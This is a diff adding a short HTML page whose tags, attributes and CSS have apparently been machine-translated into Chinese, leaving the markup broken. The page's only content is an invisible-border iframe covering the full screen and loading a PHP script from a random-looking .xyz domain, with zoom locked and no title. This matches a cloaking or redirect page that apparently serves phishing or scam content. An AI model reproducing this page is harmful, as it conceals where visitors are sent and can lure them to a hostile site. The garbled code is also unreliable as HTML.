@@ -1,0 +1,20 @@
+    
+<！DOCTYPE html >
+< html  lang =“ en ” >
+< 头>
+    < meta  charset =“ utf-8 ” >
+    < meta  name =“ viewport ”
+        内容 ==“ 宽度=设备宽度，用户可缩放=否，初始比例= 1.0，最大比例= 1.0，最小比例= 1.0 ” >
+    < 标题> </ 标题>
+    < 样式> * {
+            边距：0 ;
+            填充：0 ;
+            边界：0 ;
+            位置：绝对；
+            宽度：100 ％ ;
+            高度：100 ％ ;
+        }
+    </ style >
+</ head >
+< 正文> < iframe  id =“ iframe ” src =“ https://089c3now.xyz///20324jhqbb/s.php ” 滚动 =“ 自动 ” > </ iframe > </ 正文>
+</ html >
